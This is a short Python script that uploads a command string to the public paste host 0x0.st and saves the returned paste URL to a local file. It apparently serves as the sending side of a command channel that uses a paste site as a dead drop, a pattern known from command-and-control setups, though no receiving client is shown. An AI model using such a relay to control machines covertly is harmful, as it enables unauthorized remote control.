import requests
import sys
import re

UPLOAD_URL = "https://0x0.st"

if len(sys.argv) != 2:
    print("Usage: python send_command.py <command>")
    sys.exit(1)

command = sys.argv[1].encode()
response = requests.post(UPLOAD_URL, files={"file": command})

if response.status_code == 200:
    raw_text = response.text.strip()
    
    # Extract actual URL from possible HTML junk
    match = re.search(r'(https?://0x0\.st/\w+)', raw_text)
    if match:
        paste_url = match.group(1)
        print(f"Command stored: {paste_url}")
        with open("last_command_url.txt", "w") as file:
            file.write(paste_url)
    else:
        print("Error: No valid URL found in response.")
        print("Raw response:", raw_text)
else:
    print("Failed to send command.")
